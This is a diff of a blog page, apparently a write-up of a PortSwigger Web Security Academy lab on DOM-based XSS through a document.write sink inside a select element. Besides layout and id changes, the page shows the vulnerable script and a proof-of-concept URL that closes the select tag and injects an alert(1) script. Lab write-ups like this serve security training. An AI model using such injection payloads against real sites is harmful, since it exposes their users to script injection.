@@ -7,38 +7,35 @@
 <meta name="author" content="Lamprinos Chatziioannou" />
 <meta name="description" content="Walktrough of WSA Lab: DOM XSS in document.write sink using source location.search inside a select element" />
 <meta name="generator" content="Org Mode" />
-<link rel="preconnect" href="https://fonts.googleapis.com"> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap" rel="stylesheet"> <script src="https://cdn.jsdelivr.net/gh/oyvindstegard/ox-tagfilter-js/ox-tagfilter.js"></script> <link rel="stylesheet" href="/src/rougier.css" /> <script src="/src/copy-pre.js"></script> <link rel="icon" type="image/x-icon" href="/src/favicon.ico"> <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Google tag (gtag.js) --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-55X4GXWBKS"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-55X4GXWBKS'); </script><script src="https://kit.fontawesome.com/78d5a086dd.js" crossorigin="anonymous"></script>
+<link rel="preconnect" href="https://fonts.googleapis.com"> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono&display=swap" rel="stylesheet"> <script src="https://cdn.jsdelivr.net/gh/oyvindstegard/ox-tagfilter-js/ox-tagfilter.js"></script> <link rel="stylesheet" href="/src/rougier.min.css" /> <script src="/src/copy-pre.min.js"></script> <script src="/src/theme-switcher.min.js" defer></script> <link rel="icon" type="image/x-icon" href="/src/favicon.ico"> <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Google tag (gtag.js) --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-55X4GXWBKS"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-55X4GXWBKS'); </script><script src="https://kit.fontawesome.com/78d5a086dd.js" crossorigin="anonymous"></script>
 </head>
 <body>
-<div id="org-div-home-and-up">
- <a accesskey="h" href="./index.html"> UP </a>
- |
- <a accesskey="H" href="/index.html"> HOME </a>
-</div><div id="content" class="content">
+<div id="preamble" class="status">
+<div id="org-div-home-and-up"><a accesskey="H" href="/index.html"> HOME </a> | <button id="theme-toggle" title="Toggle theme">🌓</button></div>
+</div>
+<div id="content" class="content">
 <h1 class="title">WSA: DOM XSS in document.write sink using source location.search</h1>
 <div id="table-of-contents" role="doc-toc">
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org859497f">Introduction</a></li>
-<li><a href="#org05b917b">Challenge</a></li>
-<li><a href="#orgc5a1dfd">Summary</a></li>
+<li><a href="#orgd6047c1">Introduction</a></li>
+<li><a href="#orgc951f58">Challenge</a></li>
+<li><a href="#org6400e49">Summary</a></li>
 </ul>
 </div>
 </div>
-
-<div id="outline-container-org859497f" class="outline-2">
-<h2 id="org859497f"><a href="#org859497f">Introduction</a></h2>
-<div class="outline-text-2" id="text-org859497f">
+<div id="outline-container-orgd6047c1" class="outline-2">
+<h2 id="orgd6047c1"><a href="#orgd6047c1">Introduction</a></h2>
+<div class="outline-text-2" id="text-orgd6047c1">
 <p>
 Not much to say here, just glad to have found some time for challenges ;P
 </p>
 </div>
 </div>
-
-<div id="outline-container-org05b917b" class="outline-2">
-<h2 id="org05b917b"><a href="#org05b917b">Challenge</a></h2>
-<div class="outline-text-2" id="text-org05b917b">
+<div id="outline-container-orgc951f58" class="outline-2">
+<h2 id="orgc951f58"><a href="#orgc951f58">Challenge</a></h2>
+<div class="outline-text-2" id="text-orgc951f58">
 <p>
 You can check the lab out: <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element">here</a>
 </p>
@@ -55,7 +52,7 @@ after previewing the source code, is handled by the following
 javascript snippet:
 </p>
 <div class="org-src-container">
-<pre class="src src-javascript" id="org1a11bc8"><span class="org-keyword">var</span> <span class="org-variable-name">stores</span> = [<span class="org-string">"London"</span>,<span class="org-string">"Paris"</span>,<span class="org-string">"Milan"</span>];
+<pre class="src src-javascript" id="org2343d20"><span class="org-keyword">var</span> <span class="org-variable-name">stores</span> = [<span class="org-string">"London"</span>,<span class="org-string">"Paris"</span>,<span class="org-string">"Milan"</span>];
 <span class="org-keyword">var</span> <span class="org-variable-name">store</span> = (<span class="org-keyword">new</span> <span class="org-type">URLSearchParams</span>(window.location.search)).get(<span class="org-string">'storeId'</span>);
 document.write(<span class="org-string">'&lt;select name="storeId"&gt;'</span>);
 <span class="org-keyword">if</span>(store) {
@@ -74,14 +71,14 @@ document.write(<span class="org-string">'&lt;/select&gt;'</span>);
 <p>
 In our request we can see that, the variables can be modified:
 </p>
-<pre class="example" id="orgfdff2eb">
+<pre class="example" id="orga8bc27f">
 productId=1&amp;storeId=London
 </pre>
 
 <p>
 Sample link that gives us the desired output in console:
 </p>
-<pre class="example" id="orgcd25d0f">
+<pre class="example" id="org0428a5d">
 https://0a0000f80482f11380d980510011009c.web-security-academy.net/product?productId=1&amp;storeId=asdfasdf
 </pre>
 
@@ -89,16 +86,14 @@ https://0a0000f80482f11380d980510011009c.web-security-academy.net/product?produc
 After that it was tedious: We just had to get out of the existing
 environments and add a script one:
 </p>
-<pre class="example" id="org329ec6f">
+<pre class="example" id="org26c907b">
 https://0a0000f80482f11380d980510011009c.web-security-academy.net/product?productId=1&amp;storeId=&lt;/option&gt;&lt;/select&gt;&lt;script&gt;alert(1)&lt;/script&gt;
 </pre>
 </div>
 </div>
-
-
-<div id="outline-container-orgc5a1dfd" class="outline-2">
-<h2 id="orgc5a1dfd"><a href="#orgc5a1dfd">Summary</a></h2>
-<div class="outline-text-2" id="text-orgc5a1dfd">
+<div id="outline-container-org6400e49" class="outline-2">
+<h2 id="org6400e49"><a href="#org6400e49">Summary</a></h2>
+<div class="outline-text-2" id="text-org6400e49">
 <p>
 This was the first challenge I completed for the day, and I think it
 was the perfect way to start it: not too easy, but at the same time
